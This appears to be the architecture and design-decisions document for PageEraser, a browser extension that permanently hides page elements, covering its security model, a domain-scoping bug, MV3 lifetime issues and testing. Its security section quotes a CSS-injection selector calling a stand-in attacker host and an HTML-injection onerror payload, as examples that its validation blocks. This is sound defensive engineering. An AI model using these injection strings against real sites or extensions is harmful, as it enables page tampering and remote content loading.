# PageEraser — Architecture & Design Decisions

This document explains *why* the extension is built the way it is. It is aimed
at someone reviewing or extending the code, and it covers the decisions that
were not obvious, including the ones that were deliberately **not** taken.

---

## 1. The core constraint

PageEraser hides page elements permanently. "Permanently" is the entire product,
and it dictates the architecture:

> The rules must be applied **before the user can see the element**, on every
> page load, forever.

That single requirement rules out most of the lightweight designs:

- It cannot be an on-demand injection triggered by clicking the toolbar icon —
  by then the ad has already been painted.
- It cannot wait for `DOMContentLoaded` — the element flashes first.
- It cannot use `activeTab`-scoped injection — the user is not "activating"
  anything on a normal page load.

So the extension registers a **static content script at `document_start` matching
`<all_urls>`**, and injects a `<style>` element into `documentElement` before the
body exists. This is the only design that meets the requirement, and it is the
reason the install prompt says *"Read and change all your data on all websites."*
That warning is intrinsic, not incidental — see §6.

---

## 2. Component map

```
┌──────────────────┐   messages    ┌──────────────────────┐
│  background.js   │◄─────────────►│     content.js       │
│  service worker  │   UPDATE_     │  (every page, at     │
│                  │   BADGE       │   document_start)    │
│ • commands       │               │                      │
│ • context menus  │               │ • applies rules      │
│ • badge state    │               │ • element picker     │
└────────┬─────────┘               │ • paint mode         │
         │                         │ • toasts / Clippy    │
         │ importScripts           └──────────┬───────────┘
         ▼                                    │
   ┌───────────┐                              │
   │locales.js │                              │
   └───────────┘                              │
                                              │
┌──────────────────┐   messages               │
│    popup.js      │◄─────────────────────────┘
│  (toolbar popup) │
│                  │        ┌───────────┐
│ • rule list      │───────►│ shared.js │◄─── loaded by content.js too
│ • import/export  │        └───────────┘
│ • settings       │        domain scoping +
└──────────────────┘        selector validation
```

`shared.js` exists specifically because the popup and the content script must
*never* disagree about two things: which domain a rule belongs to, and whether a
selector is safe to inject. Both used to have their own copy of the domain
logic. See §4 for what that cost.

`modes/` holds the interactive tools. Each tool — the element picker, Paintbrush
95, and whatever comes next — is a *mode*: an object with `enter()` and `exit()`
and optional `onPointerMove`, `onClick`, `onKey` and `onModifier` hooks.
`modes/index.js` (`PE_ModeManager`) is the only code that registers page-level
listeners for them. It attaches a listener only for the hooks the active mode
defines, removes them all when the mode ends, and refuses to run two modes at
once, so a mode cannot leave a stale handler behind or fight another for the
same click. `modes/erase.js` is the element picker. A mode that ends on its own
(paint's close button) tells the manager with `release()`. The three files load
in order before `content.js`; they are classic scripts sharing one global scope,
like `shared.js`.

`modes/xray.js` (Layout X-Ray) is the second real mode. Its first half is pure
functions — display-type classification, grid/flex gap geometry, label text — so
the tests can run them in Node; the second half draws on one fixed `<canvas>`
appended to `<html>` (not `<body>`, which its `MutationObserver` watches, so its
own nodes cannot feed back into it). It collects elements once, caches their
computed-style facts, and redraws at most once per animation frame; a DOM
mutation marks the list stale and it is rebuilt at most every 250 ms. Capture
goes through the service worker (`captureVisibleTab`, covered by `activeTab`,
which the browser only grants after the user has invoked the extension on that
tab) and the PNG is saved from the page via a blob link, so the `downloads`
permission is not needed.

`modes/extract.js` (Extract to Code) is the third. Like the element picker it
selects an element on hover, and it reuses the eraser's pointer and arrow-key
handling directly (`PE_createEraseMode(host)`) rather than copying it, so the
two cannot drift apart; only the click does something different. The logic that
needs no browser lives in `modes/extract-core.js`: which computed properties to
write, folding them into shorthands, HTML cleaning and printing, colour and font
parsing, and the syntax tokenizers. The engine in `extract.js` feeds it real
computed styles. Defaults are read from an empty element of the same tag in a
throwaway `about:blank` iframe — measuring them on the page itself would count
the site's own resets (`* { margin: 0 }`) as browser defaults — and the iframe is
removed as soon as one extraction is done. The result window is built once; code
goes into it as `textContent` and `<span>`s, never as HTML.

`modes/diff.js` (Visual Diff) is the fourth. The design is a decoded bitmap
drawn on a `<canvas>`, deliberately not an `<img>`: an image element is subject to
the page's `img-src` policy, a canvas is not. Compare asks the service worker for
the visible tab — with the extension's own layers hidden for two frames first, so
only the page is in the shot — then draws the design where the overlay sits onto a
canvas of the same size as the screenshot and hands both pixel buffers to
`modes/diff-core.js`, which is pure: a per-channel threshold, differing cells of
8×8 px grouped into regions by flood fill, and the heat-map pixels. Anything that
moves or rescales the design clears the heat map, because it would describe a
layout that no longer exists. A write to `chrome.storage.local` that fails (quota)
is reported to the user and does not take the extension down: the storage facade
only declares the context lost when `chrome.runtime.id` is really gone.

The eraser wipe is not a mode: it is a CSS `mask-image` animation
(`.pe-erasing` / `.pe-restoring` in `content.css`) that `content.js` adds to the
element for 350 ms. While it plays, the element's stylesheet rule is held back
(`_sweeping`), because the rule would hide the element instantly and leave
nothing to animate; once it ends the inline hide is applied and the rule is
re-applied.

---

## 3. Security model

### 3.1 Threat model

The extension has no server, makes no network requests, and collects nothing.
There is no `fetch`, no `XMLHttpRequest`, no `eval`, no remote code. So the
interesting attack surface is not exfiltration — it is **untrusted input
reaching a privileged sink**.

There are exactly two such sinks:

| Sink | Reached from | Risk |
|---|---|---|
| `styleEl.textContent = …` (CSS injected into every page) | stored rules | CSS injection |
| `tooltipEl.innerHTML = …` (element picker tooltip) | page DOM | HTML injection |

And three sources of untrusted input:

1. **The page itself** — element ids, class names and tag names read by the picker.
2. **An imported backup file** — arbitrary JSON the user was handed by someone else.
3. **The inline selector editor** — arbitrary text the user types.

### 3.2 CSS injection

Every rule is interpolated as `${selector} { display: none !important; }`. A
selector of `@import url(http://attacker.example);x` would escape that template
and load remote CSS on every page the user visits.

`PE_isSafeSelector()` in `shared.js` blocks this in two stages:

```js
const unescaped = s.replace(/\\./g, '');       // 1. drop CSS.escape() escapes
if (/[{};@]/.test(unescaped)) return false;    // 2. reject rule terminators
document.createDocumentFragment().querySelector(s);  // 3. let CSS confirm
```

Stage 1 is the subtle part. The picker runs class names through `CSS.escape()`,
which turns a Tailwind-style `@lg:flex` into `\@lg\:flex`. A naive `if
(s.includes('@'))` filter would reject that — a *valid, extremely common* class
on modern sites — and quietly break the extension wherever it matters most.
Stripping backslash escapes first means escaped literals pass and a raw
`@import` does not.

The validation runs on **both sides of the boundary**: the popup refuses to save
an unsafe rule, and `content.js` re-validates everything it reads out of storage
before building the stylesheet. Storage is not a trust boundary — anything that
can write to it (a future bug, a migration, a hand-edited profile) must not be
able to reach the sink.

### 3.3 HTML injection

`CSS.escape()` makes a string safe for a *CSS* context, not an HTML one. An
element with `id="<img src=x onerror=…>"` produced a selector that, once
interpolated into the tooltip's `innerHTML`, parsed as markup. The impact was
bounded — an injected inline handler runs in the page's own world, not the
extension's, so it gained nothing a page could not already do — but it is a real
sink reached by page-controlled data, and static scanners flag the pattern.
`escapeHtml()` in `content.js` now runs over the tag name and the selector.

### 3.4 Least privilege

`host_permissions: ["<all_urls>"]` was removed. Its only consumer was `tab.url`
in the popup, and `activeTab` already grants that whenever the user opens the
popup, presses the shortcut, or clicks the context menu. The install warning is
unchanged (the content script alone produces it), but the extension no longer
holds a permission it never exercised.

Declared permissions are now exactly `storage`, `activeTab`, `contextMenus`.

---

## 4. Domain scoping: the bug worth reading about

Rules are stored per domain, under `pe_selectors_<domain>`. With *Apply to
Subdomains* enabled, the hostname is collapsed to its registrable domain first.
The original implementation:

```js
if (['com','co','net','org','gov','edu'].includes(secondLast) && parts.length > 3) {
  return parts.slice(-3).join('.');
}
return parts.slice(-2).join('.');
```

The `parts.length > 3` guard means a *three*-label hostname never reaches the
multi-part branch. So:

| hostname | collapsed to | consequence |
|---|---|---|
| `hepsiburada.com.tr` | `com.tr` | rule applies to **every .com.tr site** |
| `bbc.co.uk` | `co.uk` | rule applies to **every .co.uk site** |
| `myproject.github.io` | `github.io` | rule applies to **every GitHub Pages site** |

A rule hiding a header on one Turkish shop would hide it across the whole
country's TLD. This is a cross-site rule leak, and it was worst in the
extension's primary market.

The fix replaces the heuristic with an explicit suffix set covering ccTLD
second-level domains *and* shared hosting suffixes (`github.io`, `vercel.app`,
`blogspot.com`, …), where each subdomain belongs to a different owner. A full
Public Suffix List is ~15k entries and needs maintaining; this subset covers what
users actually browse and degrades to the old two-label behaviour for anything
unlisted.

`tests/run.js` carries a regression case for each row of that table.

> **Known migration gap.** Users who enabled *Apply to Subdomains* on such a site
> before v1.6.1 have rules stored under the truncated key (e.g.
> `pe_selectors_com.tr`). Those entries are now unreachable. They are left in
> place rather than deleted: the original site cannot be recovered from the key,
> and silently discarding user data is worse than leaving it orphaned.

---

## 5. MV3 service worker lifetime

The MV3 service worker is **not** a background page. It is terminated after
roughly 30 seconds of inactivity and restarted on the next event, with all
module state discarded. Two bugs came from treating it as persistent:

**Badge counts lived in a `Map`.** Hide three elements on tab A, switch to tab B,
wait, switch back — the worker had restarted, the `Map` was empty, and the badge
read zero while the rules were still applied. Moved to `chrome.storage.session`,
which survives worker teardown and clears on browser exit: exactly the lifetime a
badge count should have.

**Context menus were created once, in `onInstalled`, without `removeAll()`.**
`onInstalled` also fires on every *update*, and `contextMenus.create()` throws on
a duplicate id. Menus are also not persisted across browser restarts, and there
was no `onStartup` handler. Now: `removeAll()` → `create()`, wired to both
`onInstalled` and `onStartup`, plus a `storage.onChanged` hook so the menu labels
follow the user's language choice.

---

## 6. Content script lifetime

When the extension is reloaded, updated or disabled, every content script
already running in an open tab is **orphaned**: `chrome.runtime.id` becomes
undefined and every `chrome.*` call throws `Extension context invalidated`.
Left unhandled, each orphaned tab emits uncaught rejections for the rest of its
life and the on-page UI becomes a set of controls that silently do nothing.

`content.js` wraps storage in a facade that probes `chrome.runtime.id` first and
degrades instead of throwing — reads resolve to `{}`, writes resolve to `false`.
The first failure fires a teardown that strips the extension's own UI off the
page.

The injected `<style>` element is deliberately **left in place**. The user asked
for those elements to be hidden; making the page flash back to its unfiltered
state because the extension happened to update would be the wrong trade.

---

## 7. Deliberate trade-offs

**Vanilla JS, no build step, no dependencies.** The extension is ~150 KB of
source with a Win95 aesthetic. A bundler would add a toolchain to maintain and a
supply-chain surface to audit, in exchange for module syntax. `build.ps1` copies
an explicit file list and zips it — that is the whole pipeline.

**68.6 KB of JavaScript parsed on every page load** (`shared.js` + `content.js`),
plus 16.9 KB of CSS. Paint mode, Clippy and the audio synthesiser are all in that
bundle even on pages where they are never used. Lazy-loading them behind a
dynamic `import()` of a web-accessible resource would cut it substantially. It
has not been done because the measured win is small next to the risk of
regressing the feature that has to work at `document_start`, and because
web-accessible resources add fingerprinting surface. **This is the most
defensible next optimisation** if per-page cost ever shows up in profiling.

**Two parallel i18n systems.** The UI uses a hand-rolled `LOCALES` object rather
than `chrome.i18n`/`_locales`, because `chrome.i18n` keys off the browser UI
locale and cannot offer a manual language toggle — which this extension has.
The cost is that the manifest's own `name` and `description` stay English-only.
The service worker `importScripts('locales.js')` so context menus share the same
strings.

**No framework for the popup.** ~40 KB of imperative DOM code. A component
library would make the rule list cleaner; it would also be the single largest
dependency in a project whose selling point is that it has none.

**Erase wipe clips overflowing children.** The wipe is a CSS mask, and a mask
clips to the element's border box, so children that overflow it (dropdown
menus, tooltips) disappear the moment the wipe starts; the element itself
still wipes normally. Elements that carry their own mask are not wiped at all
and take the instant-hide path, because the sweep class would override that
mask and it would pop back afterwards.

**One-to-two-frame flash on reload.** An erased element can be visible for a
frame or two after a reload, before its rule is applied: the content script
reads storage asynchronously. This is unchanged from 1.6.1. Fixing it needs
additional permissions, so it is tracked separately.

---

## 8. Testing

`node tests/run.js` — no browser, no dependencies, 209 checks:

- **Unit tests** for `shared.js`: selector validation (including the
  `CSS.escape` case and each injection vector), domain scoping (with a
  regression case per row of the §4 table), rule normalisation.
- **Static wiring checks**, which catch the failure modes this codebase actually
  produces:
  - every `getElementById()` in the popup scripts resolves to a real element —
    one miss throws at load and the popup opens blank;
  - no duplicate element ids (added after a duplicated `alert-overlay` block
    shadowed a working dialog);
  - every `data-i18n` key exists in **both** languages;
  - every manifest- and popup-referenced file exists and is in the shipping list;
  - every `target="_blank"` link carries `rel="noopener"`;
  - the manifest declares no `host_permissions` and exactly three permissions;
  - the content scripts load `shared.js`, then `modes/`, then `content.js`, and
    every one of them is in the shipping list;
  - the wipe length in `content.js` equals the one in `content.css`, sits in the
    300–400 ms range, and honours `prefers-reduced-motion`.
- **Unit tests** for Visual Diff's pure logic: settings clamping, image limits,
  data-URL decoding, arrow-key nudging, the divider's clip, the threshold
  comparison (strictly above, per channel, uncovered pixels ignored), region
  grouping (diagonals, stray pixels, sizes that are not a multiple of the cell),
  the heat map, and static guards (no network, the design never goes through an
  `<img>`, the privacy line is present, a failed storage write is not a lost
  extension).
- **Unit tests** for Extract to Code's pure logic, against plain test doubles for
  DOM nodes: diffing against defaults and the parent (inherited vs. not, the
  currentcolor-dependent properties), shorthand folding (including a border the
  browser would draw and an elliptical corner), element collection and the
  500-element cut, attribute cleaning, id references, printing that must not
  change rendering (inline whitespace, `<pre>`, SVG), colours, font stacks and
  `@font-face` sources, and the tokenizers (lossless on well-formed and broken
  input), plus static guards (no network, a single `innerHTML`, no writes to the
  page's elements).
- **Unit tests** for the Layout X-Ray helpers: display-type colour family, px and
  grid-track parsing, grid/flex/wrapped-flex gap lines (including reverse
  directions and spacing that is *not* the declared gap), label text, and static
  guards — no network or `downloads` use, no writes to measured elements, legend
  colours in CSS equal the ones the canvas draws with.
- **Unit tests** for the mode manager against a fake page: one mode at a time,
  listeners attached only for defined hooks and all removed on exit, pointer
  moves throttled to one per frame, no call into a mode after it has ended,
  `release()` and a failing `enter()` leaving nothing behind.

`build.ps1` runs the suite and refuses to package a failing build. CI runs the
same on every push and uploads the packaged ZIP as an artifact.

What is **not** covered: anything requiring a real browser — actual injection
timing, the wipe animation itself, the X-Ray overlay's rendering and Capture, the Visual Diff overlay, drag-and-drop, paste and Compare, how faithfully an extract renders on its own, paint mode, cross-browser rendering. Those are manual. A Puppeteer
harness loading the unpacked extension is the obvious next step.

---

## 9. Packaging

`build.ps1` ships an **explicit allowlist**, not the repository. `test.html`,
`mock-chrome.js`, `screenshots/`, `docs/`, `tests/` and the README stay out:
every extra file in the upload is one more thing a store reviewer has to read
and rule out, and `mock-chrome.js` in particular is a stub `chrome` object that
looks exactly like something worth investigating.

The script fails the build if the manifest or `popup.html` references a file the
allowlist does not ship — so the package cannot silently lose a script.
